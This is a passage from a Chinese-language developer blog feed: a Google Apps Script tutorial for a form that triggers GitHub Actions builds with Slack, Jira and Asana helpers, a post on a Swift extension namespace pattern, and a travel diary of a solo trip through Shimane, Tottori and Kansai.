20px; } .form-group button { background-color: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; } .form-group button:hover { background-color: #45a049; } .message { margin-top: 20px; padding: 15px; border-radius: 5px; font-size: 1em; text-align: center; } .message.success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; } .message.error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; } .hidden { display: none; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"form-container\"&gt; &lt;h2&gt;&lt;?=title?&gt;&lt;/h2&gt; &lt;form id=\"myForm\"&gt; &lt;div id=\"message-block\" class=\"hidden\"&gt;&lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"email\"&gt;電子郵件：&lt;/label&gt; &lt;input type=\"email\" value=\"&lt;?=email?&gt;\" readonly/&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"buildNumber\"&gt;版本號：&lt;/label&gt; &lt;input type=\"number\" value=\"&lt;?=buildNumber?&gt;\"/&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"branch\"&gt;Review 中的 PR：&lt;/label&gt; &lt;select id=\"branch\" name=\"branch\"&gt; &lt;option&gt;請選擇&lt;/option&gt; &lt;? pullRequests.forEach(pullRequest =&gt; { ?&gt; &lt;option value=\"&lt;?=pullRequest.head.ref?&gt;\"&gt;[&lt;?=pullRequest.state?&gt;] &lt;?=pullRequest.title?&gt;&lt;/option&gt; &lt;? }); ?&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"message\"&gt;更新內容：&lt;/label&gt; &lt;textarea id=\"message\" name=\"message\" rows=\"4\" placeholder=\"請輸入您的訊息\"&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;button type=\"submit\"&gt;送出&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;script&gt; function displayMessage(ok, message) { const messageBlock = document.getElementById('message-block'); messageBlock.className = ok ? 'message success' : 'message error'; messageBlock.innerHTML = message; messageBlock.classList.remove('hidden'); } document.getElementById(\"myForm\").addEventListener(\"submit\", function(e) { e.preventDefault(); const formData = new FormData(this); const formObject = Object.fromEntries(formData); google.script.run.withSuccessHandler((response) =&gt; { displayMessage(response.ok, response.message); }).processForm(formObject); }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;表單內容可依照需求自行調整。程式碼.gs：function doGet(e) { // 對應到左方檔案 Form.html const htmlTemplate = HtmlService.createTemplateFromFile('Form'); const email = Session.getActiveUser().getEmail(); // 取得使用者信箱，只限 執行身份：存取網頁程式的使用者 設定有效 const title = \"App CD 打包請求表單\"; const buildNumber = genBuildNumber(); htmlTemplate.email = email; htmlTemplate.title = title; htmlTemplate.pullRequests = []; // 下一步在串接 Github... htmlTemplate.buildNumber = buildNumber; const html = htmlTemplate.evaluate(); html.setTitle(title); //html.setWidth(600) // 設定頁面寬度 return html}function processForm(object) { return {\"ok\": true, \"message\": \"請求送出成功！\"};}function genBuildNumber() { const now = new Date(); const formattedDate = Utilities.formatDate(now, \"Asia/Taipei\", \"yyyyMMddHHmmss\"); const milliseconds = now.getMilliseconds().toString().padStart(3, '0'); // 確保毫秒是 3 位數 return `${formattedDate}${milliseconds}`; }這一步，我們先把表單 GUI 完成，下一步再來串接 Github API 拿到 PR 分支列表。Step 2. 部署 Google Apps Script Web App Form我們先把剛剛的內容部署一次，查看結果。在 GAS 右上角選擇「部署」-&gt; 「新增部署作業」-&gt;「網頁應用程式」：執行身份跟誰可以存取分別可以設置成：執行身份：我 會以你的帳號身分執行腳本。 誰可以存取：只有我自己 誰可以存取：XXX 同個組織中的所有使用者只有同組織＋已登入的 Google 帳號使用者可以存取。 誰可以存取：所有已登入 Google 帳號的使用者已登入的 Google 帳號使用者都可以存取。 誰可以存取：所有人不需要登入 Google 帳號、所有人都可以公開存取。執行身份：存取網頁程式的使用者 會以你的帳號身分執行腳本。 誰可以存取：只有我自己 誰可以存取：XXX 同個組織中的所有使用者只有同組織＋已登入的 Google 帳號使用者可以存取。 誰可以存取：所有已登入 Google 帳號的使用者已登入的 Google 帳號使用者都可以存取。 我們選擇「誰可以存取：XXX 同個組織中的所有使用者」＋「執行身份：存取網頁程式的使用者」就能 自動限制只有組織帳號的人可以使用 ，並且用他自己的身份執行！ 是一個很方便權限控管的功能！選完點擊右下「部署」。網頁應用程式中的網址，就是 Web App 存取網址。https://script.google.com/macros/s/AKfycbw8SuK7lLLMdY86y3jxMJyzXqa5tdxJryRnteOnNi-lK--j6CmKYXj7UuU58DiS0NSVvA/exec 網址很長很醜，但是沒辦法，只能自己找短網址工具縮短一下。點網址打開頁面查看效果：這邊要多提兩個 GAS 限制： GAS Web App 上方警告提示，預設無法隱藏 GAS Web App 是用 IFrame 把我們的頁面嵌在裡面，因此很難做到 100% RWD 效果只能使用 .setWidth() 調整視窗寬度Google Apps Script 授權警告第一次使用 、點擊「偵錯」或「執行」可能會出下以下授權警告：選擇想要執行的身份帳號，如果有出現「這個應用程式未經 Google 驗證」則點擊「進階」-&gt;「前往 XXX (不安全)」，選擇「允許」：如果 GAS 程式權限有變動(例如：多加存取 Google Sheet…etc)才會需要再重新授權，不然點過一次就不會再出現。Step 3. 串接 Github API 取得 PR 分支列表我們新增一個 Github.gs 程式檔案存放 Github API 相關邏輯。Github.gs：// SECRETconst githubPersonalAccessToken = \"\"// 使用你的 Github 帳號或組織共用的 Github 帳號創建 PAT// https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens// 方式 1: Restful API 存取function githubAPI(method, path, payload = null) { try { const url = \"https://api.github.com\"+path; var options = { method: method, headers: { \"Accept\": \"application/vnd.github+json\", \"Authorization\": `Bearer ${githubPersonalAccessToken}`, \"X-GitHub-Api-Version\": \"2022-11-28\" } }; if (method.toLowerCase().trim() == \"post\") { options.payload = JSON.stringify(payload); } const response = UrlFetchApp.fetch(url, options); const data = JSON.parse(response.getContentText()); return data; } catch (error) { throw error; }}// 方式 2: GraphQL 存取// Github API 部分更細的查詢功能只有 GraphQL API 有提供// https://docs.github.com/en/graphqlfunction githubGraphQL(query, variables) { const url = \"https://api.github.com/graphql\"; const payload = { query: query, variables: variables }; const options = { method: \"post\", contentType: \"application/json\", headers: { \"Accept\": \"application/vnd.github+json\", \"Authorization\": `Bearer ${githubPersonalAccessToken}`, \"X-GitHub-Api-Version\": \"2022-11-28\" }, payload: JSON.stringify(payload) }; try { const response = UrlFetchApp.fetch(url, options); const data = JSON.parse(response.getContentText()); return data; } catch (error) { throw error; }}// GraphQL Example:// const query = `// query($owner: String!, $repo: String!) {// repository(owner: $owner, name: $repo) {// pullRequests(states: OPEN, first: 100, orderBy: { field: CREATED_AT, direction: DESC }) {// nodes {// title// url// number// createdAt// author {// login// }// headRefName// baseRefName// body// }// pageInfo {// hasNextPage// endCursor// }// }// }// }// `;// const variables = {// owner: \"swiftlang\",// repo: \"swift\"// };// const response = githubGraphQL(query, variables);Github API 有兩種存取方式，一種是傳統的 Restful，另一種是更彈性的 GraphQL；本文以 Restful 為例。程式碼.gs：function doGet(e) { // 對應到左方檔案 Form.html const htmlTemplate = HtmlService.createTemplateFromFile('Form'); const email = Session.getActiveUser().getEmail(); // 取得使用者信箱，只限 執行身份：存取網頁程式的使用者 設定有效 const title = \"App CD 打包請求表單\"; const pullRequests = githubAPI(\"get\", \"/repos/swiftlang/swift/pulls\"); // 以 https://github.com/swiftlang/swift/pulls 為例 const buildNumber = genBuildNumber(); htmlTemplate.email = email; htmlTemplate.title = title; htmlTemplate.pullRequests = pullRequests; htmlTemplate.buildNumber = buildNumber; const html = htmlTemplate.evaluate(); html.setTitle(title); //html.setWidth(600) // 設定頁面寬度 return html}function processForm(object) { if (object.buildNumber == \"\") { return {\"ok\": false, \"message\": \"請輸入版本號！\"}; } if (object.branch == \"\") { return {\"ok\": false, \"message\": \"請選擇分支版本！\"}; } // 帶上你要帶到 Github Action 的參數 const payload = { ref: object.branch, inputs: { buildNumber: object.buildNumber } }; // try { const response = githubAPI(\"post\", \"/repos/zhgchgli0718/ios-project-for-github-action-ci-cd-demo/actions/workflows/CD-Job.yml/dispatches\", payload); // 以 https://github.com/zhgchgli0718/ios-project-for-github-action-ci-cd-demo/blob/main/.github/workflows/CD-Job.yml 為例 return {\"ok\": true, \"message\": `打包請求發送成功!&lt;br/&gt;對應分支：&lt;strong&gt;${object.branch}&lt;/strong&gt;&lt;br/&gt;版號：&lt;strong&gt;${object.buildNumber}&lt;/strong&gt;`}; } catch (error) { return {\"ok\": false, \"message\": \"發生錯誤：\"+error.message}; }}processForm 方法中處理表單回傳的內容，也可以多加上更多吃GAS x Github API x Github Action這邊多補充一下對應到的 Github Action。CD-Job.yml：# CD 打包工作name: CD-Jobon: workflow_dispatch: inputs: buildNumber: # 對應 GAS payload.inpus.xxx description: '版本號碼' required: false type: string # ...More # Inputs 類型可參考官方文件：https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#onworkflow_dispatchinputs jobs: some-job: runs-on: ubuntu-latest steps: - name: Print Inputs run: | echo \"Release Build Number: ${{ github.event.inputs.buildNumber }}\" Step 4. 重新部署 Google Apps Script Web App Form ⚠️請注意，GAS 程式碼的任何調整都需要重新部署，才會生效。⚠️ ⚠️請注意，GAS 程式碼的任何調整都需要重新部署，才會生效。⚠️ ⚠️請注意，GAS 程式碼的任何調整都需要重新部署，才會生效。⚠️GAS 右上角選擇「部署」-&gt; 選擇右上角「編輯」-&gt; 版本選擇「建立新版本」點擊「部署」-&gt; 完成。再回到網頁上重新整理，就能看到修改後的結果了： ⚠️請注意，GAS 程式碼的任何調整都需要重新部署，才會生效。⚠️ ⚠️請注意，GAS 程式碼的任何調整都需要重新部署，才會生效。⚠️ ⚠️請注意，GAS 程式碼的任何調整都需要重新部署，才會生效。⚠️Done! 🎉🎉🎉Demo Web App Form現在你可以在組織內分享這個連結給其他夥伴，他們可以直接使用這個網頁 GUI 執行 CI/CD 工作。延伸 (1)— 用使用者的信箱查詢 Slack User ID &amp; 發送、更新進度通知前文有提到，我們希望及時通知使用者 CI/CD 執行狀況，我們可以使用使用者提供的信箱去查 Slack User ID。Slack.gs：const slackBotToken = \"\"// https://medium.com/zrealm-robotic-process-automation/slack-chatgpt-integration-bd94cc88f9c9function slackRequest(path, content) { const options = { method: \"post\", contentType: \"application/json\", headers: { Authorization: `Bearer ${slackBotToken}`, // Use the bot token for authorization, 'X-Slack-No-Retry': 1 }, payload: JSON.stringify(content) }; try { const response = UrlFetchApp.fetch(\"https://slack.com/api/\"+path, options); const responseData = JSON.parse(response.getContentText()); if (responseData.ok) { return responseData } else { throw new Error(`Slack: ${responseData.error}`); } } catch (error) { throw error; }}// 用信箱查詢 Slask UIDfunction getSlackUserId(email) { return slackRequest(`users.lookupByEmail?email=${encodeURIComponent(email)}`)?.user?.id;}// 發送訊息給目標 Slack UID (channelID)function sendSlackMessage(channelId, ts = null, value) { var content = { channel: channelId }; if (ts != null) { content.thread_ts = ts; } if (typeof value === \"string\") { content.text = value; } else { content.blocks = value; } return slackRequest(\"chat.postMessage\", content);}// 更新發送的訊息內容function updateSlackMessage(channelId, ts = null, value) { var content = { channel: channelId }; if (ts != null) { content.ts = ts; } if (typeof value === \"string\") { content.text = value; } else { content.blocks = value; } return slackRequest(\"chat.update\", content);}Slack API 使用請參考 官方文件 。Githun Action YAML 可以使用這個 Action 持續更新訊息、發送 Slack 訊息：# ...on: workflow_dispatch: inputs: buildNumber: # 對應 GAS payload.inpus.xxx description: '版本號碼' required: false type: string # ...More SLACK_USER_ID: description: 'Slack User Id for receive action notification' type: string SLACK_CHANNEL_ID: description: 'Slack Channel Id for receive action notification' type: string SLACK_THREAD_TS: description: 'Slack message ts' type: string jobs: # some jobs... if-deploy-failed-message: runs-on: ubuntu-latest if: failure() - name: update slack message uses: slackapi/slack-github-action@v2.0.0 with: method: chat.update token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ github.event.inputs.SLACK_CHANNEL_ID }} ts: ${{ github.event.inputs.SLACK_THREAD_TS }} text: \"❌ 打包任務失敗，請檢查執行狀況結果或稍後再試。\\n&lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|點此查看執行狀況&gt; cc'ed &lt;@${{ github.event.inputs.SLACK_USER_ID }}&gt;\"效果： Slack App 串接細節可參考我之前的文章： Slack &amp; ChatGPT Integration 。延伸 (2) —查詢 Jira 工單Jira.gs：const jiraPersonalAccessToken = \"\"// https://confluence.atlassian.com/enterprise/using-personal-access-tokens-1026032365.htmlfunction getJiraTickets() { const url = `https://xxx.atlassian.net/rest/api/3/search`; // JQL query const jql = `project = XXX`; const queryParams = { jql: jql, maxResults: 50, // Adjust as needed }; const options = { method: \"get\", headers: { Authorization: \"Basic \" + jiraPersonalAccessToken, \"Content-Type\": \"application/json\", }, muteHttpExceptions: true, }; const queryString = Object.keys(queryParams).map(key =&gt; `${encodeURIComponent(key)}=${encodeURIComponent(queryParams[key])}`).join(\"&amp;\"); const response = UrlFetchApp.fetch(url + \"?\" + queryString + \"&amp;fields=\", options); // could specify only return some fields if (response.getResponseCode() === 200) { const issues = JSON.parse(response.getContentText()).issues; return issues; } else { Logger.log(`Error: ${response.getResponseCode()} - ${response.getContentText()}`); throw new Error(\"Failed to fetch Jira issues.\"); }} 其他 Jira API 使用請參考 官方文件 。延伸 (3) — 查詢 Asana 工單Asana.gs：const asanaPersonalAccessToken = \"\"// https://developers.asana.com/docs/personal-access-tokenfunction asanaAPI(endpoint, method = \"GET\", data = null) { var options = { \"method\" : method, \"contentType\" : \"application/json\", \"headers\": { \"Authorization\": \"Bearer \"+asanaPersonalAccessToken } }; if (data != null) { options[\"payload\"] = JSON.stringify({\"data\":data}); } const url = \"https://app.asana.com/api/1.0\"+endpoint; const res = UrlFetchApp.fetch(url, options); const data = JSON.parse(res.getContentText()); return data;}// 查找 tasks in project// asanaAPI(\"/projects/PROJECT_ID/tasks\");其他 Asana API 使用請參考 官方文件 。總結自動化、工作及開發流程優化缺的永遠不是技術，而是想法；只要有想法我們都能找到適合的技術來實現，共勉之！有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 131 Total Views Last Statistics Date: 2025-01-19 | 116 Views on Medium. " }, { "title": "Swift 一個優雅的原生類型擴展方式", "url": "/posts/a8925ad9ed01/", "categories": "ZRealm Dev.", "tags": "ios-app-development, swift, wrapper, app-modularization, ios", "date": "2025-01-01 22:02:32 +0800", "snippet": "[Swift] 一個優雅的 原生類型擴展方式自行封裝擴充方法，使其有 Namespace 的功能https://www.swift.org/ 做法實際出處不詳，是從厲害同事的 Code 上學到的。原生類型擴展在日常的 iOS/Swift 開發中，我們常常需要對原生 API 進行擴充、撰寫自己的 Helper。以下以擴充 UIColor 為例，我們希望擴充 UIColor 使其能轉換成 HE...", "content": "[Swift] 一個優雅的 原生類型擴展方式自行封裝擴充方法，使其有 Namespace 的功能https://www.swift.org/ 做法實際出處不詳，是從厲害同事的 Code 上學到的。原生類型擴展在日常的 iOS/Swift 開發中，我們常常需要對原生 API 進行擴充、撰寫自己的 Helper。以下以擴充 UIColor 為例，我們希望擴充 UIColor 使其能轉換成 HEX Color String：extension UIColor { /// Convert a UIColor to a hex string representation. /// - Returns: A hex string (e.g., \"#RRGGBB\" or \"#RRGGBBAA\"). func toHexString(includeAlpha: Bool = false) -&gt; String? { var red: CGFloat = 0 var green: CGFloat = 0 var blue: CGFloat = 0 var alpha: CGFloat = 0 guard self.getRed(&amp;red, green: &amp;green, blue: &amp;blue, alpha: &amp;alpha) else { return nil // Color could not be represented in RGB space } if includeAlpha { return String(format: \"#%02X%02X%02X%02X\", Int(red * 255), Int(green * 255), Int(blue * 255), Int(alpha * 255)) } else { return String(format: \"#%02X%02X%02X\", Int(red * 255), Int(green * 255), Int(blue * 255)) } }}直接對 UIColor 進行擴充 (Extension) 後的存取方式如下：let color = UIColor.bluecolor.toHexString() // #0000ff問題當我們自定義的擴充方式越來越多會讓存取介面開始變得混亂，例如：let color = UIColor.bluecolor.getRed(...)color.getWhite(...)color.getHue(...)color.getCMYK() // 自行擴充的方法color.toHexString() // 自行擴充的方法color.withAlphaComponent(...)color.setFill(...)color.setToBlue() // 自行擴充的方法// A Modulepublic extension UIColor { func getCMYK() { // ... }}// B Module// Invalid redeclaration of 'getCMYK()'public extension UIColor { func getCMYK() { // ... }}我們自行擴充的方法跟原生提供的方法全部混合在一起，難以區分；另外專案規模越大、引用的套件越多也有可能遇到 Extension 命名衝突，例如兩個套件都對 UIColor Extension 也都叫 getCMYK() 就會有問題。自訂擴展 Namespace 容器我們可以運用 Swift Protocol, Computed Property 與 泛型的特型來自行封裝擴充方法，使其有 Namespace 的功能。// 宣告一個泛型容器 ExtensionContainer&lt;Base&gt;：public struct ExtensionContainer&lt;Base&gt; { public let base: Base public init(_ base: Base) { self.base = base }}// 定義 for AnyObject, Class(Reference) Type 實現的接口：// 例如 Foundation 中的 NSXXX 類別public protocol ExtensionCompatibleObject: AnyObject {}// 定義 for Struct(Value) Type 實現的接口：public protocol ExtensionCompatible {}// 自訂義 Namespace Computed Property：public extension ExtensionCompatibleObject { var zhg: ExtensionContainer&lt;Self&gt; { return ExtensionContainer(self) }}public extension ExtensionCompatible { var zhg: ExtensionContainer&lt;Self&gt; { return ExtensionContainer(self) }}擴展原生類型extension UIColor: ExtensionCompatibleObject {}extension ExtensionContainer where Base: UIColor { /// Convert a UIColor to a hex string representation. /// - Returns: A hex string (e.g., \"#RRGGBB\" or \"#RRGGBBAA\"). func toHexString(includeAlpha: Bool = false) -&gt; String? { var red: CGFloat = 0 var green: CGFloat = 0 var blue: CGFloat = 0 var alpha: CGFloat = 0 guard self.base.getRed(&amp;red, green: &amp;green, blue: &amp;blue, alpha: &amp;alpha) else { return nil // Color could not be represented in RGB space } if includeAlpha { return String(format: \"#%02X%02X%02X%02X\", Int(red * 255), Int(green * 255), Int(blue * 255), Int(alpha * 255)) } else { return String(format: \"#%02X%02X%02X\", Int(red * 255), Int(green * 255), Int(blue * 255)) } }}使用let color = UIColor.bluecolor.zhg.toHexString() // #0000ff範例 2. URL .queryItems 擴充extension URL: ExtensionCompatible {}extension ExtensionContainer where Base == URL { var queryParameters: [String: String]? { URLComponents(url: base, resolvingAgainstBaseURL: true)? .queryItems? .reduce(into: [String: String]()) { $0[$1.name] = $1.value } }}結合 Builder Pattern另外我們也可以將此封裝方式結合 Builder Pattern 操作：final class URLBuilder { private var components: URLComponents init(base: URL) { self.components = URLComponents(url: base, resolvingAgainstBaseURL: true)! } func setQueryParameters(_ parameters: [String: String]) -&gt; URLBuilder { components.queryItems = parameters.map { .init(name: $0.key, value: $0.value) } return self } func setScheme(_ scheme: String) -&gt; URLBuilder { components.scheme = scheme return self } func build() -&gt; URL? { return components.url }}extension URL: ExtensionCompatible {}extension ExtensionContainer where Base == URL { func builder() -&gt; URLBuilder { return URLBuilder(base: base) }}let url = URL(string: \"https://zhgchg.li\")!.zhg.builder().setQueryParameters([\"a\": \"b\", \"c\": \"d\"]).setScheme(\"ssh\").build()// ssh://zhgchg.li?a=b&amp;c=d有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 128 Total Views Last Statistics Date: 2025-01-19 | 33 Views on Medium. " }, { "title": "遊記 2024 山陰地區(+關西) 島根出雲松江鳥取姬路大阪 7 日獨旅自由行", "url": "/posts/aacd5f5cacd1/", "categories": "Z 度旅行遊記", "tags": "生活, japan, travel-writing, 島根縣, 旅遊", "date": "2024-12-03 00:04:56 +0800", "snippet": "[遊記] 2024 山陰地區( +關西) 島根出雲松江鳥取姬路大阪 7 日獨旅自由行岡山進出，先去山陰島根縣出雲松江再去鳥取，最後回到姬路、關西、大阪；7 天 10 萬步、交通橫跨 1,000 公里，一次踩點山陰關西地區。宍道湖夕陽前言最一開始 2024 下半年是想去仙台的，不過查了一下景點資料，這個時間點去，我的興趣普普；回想到去年同一週 11/13–18 去了 「 山陽地區 廣島岡山 6...", "content": "[遊記] 2024 山陰地區( +關西) 島根出雲松江鳥取姬路大阪 7 日獨旅自由行岡山進出，先去山陰島根縣出雲松江再去鳥取，最後回到姬路、關西、大阪；7 天 10 萬步、交通橫跨 1,000 公里，一次踩點山陰關西地區。宍道湖夕陽前言最一開始 2024 下半年是想去仙台的，不過查了一下景點資料，這個時間點去，我的興趣普普；回想到去年同一週 11/13–18 去了 「 山陽地區 廣島岡山 6 日自由行 」 對中國地方、山陽、岡山的印象很好 — 景色很美、交通方便、觀光客較少；因此想說這次把山陰地區(島根、鳥取)也走一遍，剛好工作也有空檔跟近期心煩意亂急需放空；促成了這次 7 天 6 夜山陰地區(加上關西地區：姬路、大阪)獨旅自由行。準備工作日期：11/12–18這次也是 P 人發作，10 月中臨時抓到時間空檔，隨即安排 11/12 出發，11/18 回程。✈️機票今年沒有特別搶虎航秋季活動機票， 去年有買到優惠機票 時間比較好又比較便宜( 去年：去(11:10)、回(15:25)，含來回 20KG 託運＋選位＋雜費：NT$ 7,012 )。 去：13:05 TPE 台北桃園國際機場-&gt; 16:30 OKJ 岡山桃太郎機場 回： 17:30 OKJ 岡山桃太郎機場 -&gt; 19:35 TPE 台北桃園國際機場 含來回 20KG 托運＋選位＋雜費價格： NT$ 9,118沒特別便宜，但還可以接受，如果選同去年的去回時間會更貴，大概要 NT$ 12,000 。 台灣虎航 2025年初可能會開 台北直飛鳥取機場的航線 ，開航之後要去山陰地區就更方便了！🏝️計畫沒去過山陰地區跟姬路，以這三個地方為主。 11/12 晚上抵達岡山，住一晚為明早去島根做準備 11/13 一早搭 JR 前往島根，先去出雲大社、稻佐海濱，下午傍晚去宍道湖看夕陽 11/14 早上松江城、松江堀川遊船，下午足立美術館，晚上抵達鳥取 11/15 早上白兔神社、下午鳥取沙丘，晚上抵達姬路 11/16 姬路城、姬路市區逛街實際多去：書寫山圓教寺 11/17 大鳴門橋遊歩道 渦之道、鳴門旋渦、明石海峽大橋實際因天氣不佳沒去，改去大阪、神戶逛街吃東西。 11/18 岡山站逛街、回程🚅行- 日本 JR PASS｜關西&amp;山陰地區鐵路周遊券｜eMCO 電子票這次也是長距離移動，必買 JR Pass，本來還怕只有山陰、山陽 JRass，沒想到日本 JR 很貼心的把有可能的路線都規劃好了，有「 關西&amp;山陰地區鐵路周遊券 JRPass 」正合我意！關西&amp;山陰地區鐵路周遊券 JRPass 可用範圍 價格： NT$ 3,779 多送一張 山陰山陽地區PASS周遊3日券 (搭配用起來很划算)📱網路這次也一併從 KKday 買「 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案｜優惠65折 」 7 日 無限流量 eSIM 方案 價格： NT$ 847實際用下來很好，很穩定、沒遇到被降速或斷線問題。 eSIM 啟用方式、注意事項本文中會附上，請繼續閱讀。日幣換了日幣新鈔。 建議新舊鈔都帶一些，部分販賣機無法吃新鈔。可以吃新鈔的販賣機🏠住宿這次很幸運地只有松江一晚沒訂到 東橫 Inn ，其他都有訂到。11/12 東橫INN 岡山站東口 (一晚)出岡山車站走 4 分鐘就會到 禁煙雙床房，入住：1 人 價格： NT$ 1,61611/13 Matsue Urban Hotel (一晚)松江站出站走 2 分鐘就會到 Double Room with Small Double Bed — Non-Smoking — Building 2入住：1 人 價格： NT$ 2,43111/14 東橫INN 鳥取站南口 (一晚)鳥取站出站走 4 分鐘就會到 禁煙雙人房，入住：1 人 價格： NT$ 1,59511/15 東橫INN 姬路站新幹線北口 (三晚)姬路站出站走 5 分鐘會到 禁煙雙人房，入住：1 人 價格： NT$ 6,055 ， NT$ 2,018 /晚雖然幾乎都有訂到東橫，但還是因為預定時間太晚只剩雙人房，所以一晚的價格比較高，如果有訂到單人房型應該可以壓到一晚 NT$ 1,500 以內；不過以往經驗，日期接近就算是雙人房也都會全滿，可能地點真的比較少人去？ 房間開箱影片本文中會附上，請繼續閱讀。— Flight Tracker、iPhone Suica 使用、Visit Japan 預入境申請…之前文章有提過，這篇就不多贅述了。 Visit Japan 唯一跟之前不一樣的只有「入境審查」與「海關申報」QR Code 已合併成同一個「入境审查及海关申报的QR码」，沒有藍碼黃碼區別。虎航線上自助報到約出發前 1~3 天會收到虎航寄發的行程通知信， 務必！務必！務必！ 在出發前直接完成線上「自助報到」：點擊自助報到後會前往虎航官網，確認旅客資料、行李安全，最後會產生、寄發「登機證」。保存好登機證，憑此去機場就可以直接排「行李自助托運」掛行李，不用浪費時間排長長的「一般報到」櫃檯。さあ行こう 出發！KKday 推廣 🛒 日本 JR PASS|鳥取・松江區域周遊券|eMCO 電子票 (如果只去松江、鳥取松江地區可考慮) 關西&amp;山陰地區鐵路周遊券 JRPass (岡山機場進出最佳選擇) 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 日本 JR PASS｜山陽＆山陰地區鐵路周遊券｜eMCO 電子票 (一口氣玩遍山陽山陰地區) 鳥取沙丘 | 日本唯一的驚險滑沙體驗 【鳥取巴士一日遊】鳥取砂丘、浦富海岸巡航、砂之美術館、採梨子體驗｜含特色午餐（大阪出發） 遊覽鳥取沙丘和著名的出雲大社 2 日巴士之旅（大阪出發） 新年參觀！出雲大社停留3小時【廣島出發】Day 1 (11/12 週二) 出發下午 13:05 的飛機，早上 8 點起床快 9 點出門，時間上綽綽有餘。2024/11 擷取自預辦登機官網虎航 預辦登機服務(在機捷就報到+掛行李，到機場直接出境) 只能在 機捷A3新北產業園區站 ；不能在北車，所以就一路搭機捷直達車前往第一航廈了。~= 10:00 抵達機場大約 10:00 就抵達機場，要等 10:20 才開櫃。~= 10:20 排「行李自助托運」掛行李去程：9 KG這時候是先從虎航網站使用網路報到的優勢就來了，當天目測現場「一般報到」櫃檯大排長龍，10:20 就已經排滿，預估至少要等 45 分鐘到 1 小時；「行李自助托運」這邊大概花不到 15 分鐘就完成手續，節省很多等待時間。 現場完成線上報到，再去排「行李自助托運」都比去排「一般報到」快得多。~= 10:50 完成出境這次在第一航廈的 A1 登機門。(終於不用再搭擺渡車了)之前來第一航廈每次都吃頂呱呱，這次改吃老董牛肉麵，店面位置就在快到 A1 登機門的地方也很順路。~= 11:30 候機吃飽亂晃一下大約 11:30，A1 登機門的壞處是離 一航免費貴賓室 很遠，懶得走來走去就直接來候機室了。沒事先處理一下兩個網路問題，第一個是我的 中華電信漫遊功能是關閉的 ，有需要漫遊方案無法直接購買；所以先打電話去中華電信解鎖漫遊功能，以備不時之需。需要打電話給中華電信、確認個人資料後請客服解除鎖定。事先啟用 eSIM (iPhone 為例)第二個網路問題是先在機場啟用 eSIM，因 eSIM 輸入啟用需要連接網路，怕岡山機場的 WiFi 不穩定，所以事先在台灣網路正常的情況下輸入啟用日本 eSIM。 如果還是很怕網路造成入境問題， 也可先截圖入境 QR Code 或同步寫紙本入境卡，雙重保障。之前去 泰國買的 eSIM 可以直接在購買憑證信、PDF 或截圖照片中長按 QR Code 出現「加入 eSIM」點擊即可自動加入 ，但這次買的日本 eSIM 卻沒有出現：有找到一個 網友提供 的方法可以成功出現「加入 eSIM」選項。(感覺是 iOS Bug，iOS 17.4 之後就壞了)： 前往 eSIM 憑證信、PDF 按下手機截圖，將截圖存在照片相簿中 打開手機相機，點左下角進入相簿 在相簿中找到 eSIM 照片，長按 QRCode 就會出現「加入 eSIM」選項 點擊「加入 eSIM」直接帶入啟用資訊啟用 eSIMiPhone 手動啟用 eSIM前往「設定」-&gt;「行動服務」-&gt;「加入 eSIM」-&gt;「使用行動條碼」：我有把 eSIM QRCode 印出來，所以我是從這邊直接掃描啟用的。如果你什麼都沒有可以點「手動輸入詳細資訊」複製貼上 eSIM 憑證資訊手動啟用：對應信件內容填上 SM-DP+ 位址 、 啟用碼 、 確認碼 (這次沒有)，點下一步完成啟用。輸入完成後需要花一點時間啟用，可能會卡在「啟用中…」一陣子或是跳出啟用失敗稍後再試之類的；再等一下子就好了，啟用成功在「設定」-&gt;「行動服務」中會顯示「開啟」右上角訊號圖標也會出現下面一排 … 顯示訊號狀況。 行動方案標籤可選擇「旅遊」 我們還在台灣，暫時還無法連接使用 eSIM 日本網路，只要確認啟用成功即可。~= 12:20 開始登機，無誤點~= 13:05 準時起飛此時台灣開始下大雨，但是沒什麼風對起飛影響不大。虎航的位子舒適度我覺得算廉航中優秀的了(相較樂桃太小、越捷椅子不好坐)，不過虎航的缺點是 禁止自帶食物 ，剛吃飽不餓！機上無 WiFi 只能聽聽音樂玩玩單機遊戲。可以從窗外看到日本天氣很好。👍👍👍16:30 (台灣時間 15:30) 準時降落降落日本後我們的日本 eSIM 應該就能收到訊號了。 有訊號但還無法上網，要再到「設定」-&gt;「行動服務」-&gt; 點選進入 旅遊 日本 eSIM -&gt; 確認有「開啟此號碼」跟 打開「數據漫遊」這樣才會有網路！⚠️⚠️⚠️ 另外也可以進入 主要 中華電信 號碼，如果您沒有購買中華電信的漫遊方案請記得 關閉這邊的「數據漫遊」、「開啟此號碼」可以繼續保持啟用，這樣才能收台灣的簡訊！ 請注意：不要隨意接電話、海外接國內電話收話方也會被收費！⚠️⚠️⚠️ (只有收簡訊免費)~= 17:00 完成入境、拿行李 岡山桃太郎機場是非常小的機場，同一時間只有一班國際航班(就是你這班而已)，跟著同機的人一起入境、拿行李，很快。(本次航班看起來快滿載，大約花 30 分鐘就出來了) 意外的事是機場工作人員都會講中文 可能因為小機場比較嚴格，如果跟我一樣獨旅的幾乎都被問會待幾天？會去哪些地方？有的還被要求出示飯店訂單。(因此自己去的話請提早準備應對)機場 WiFi 岡山機場免費 WiFi 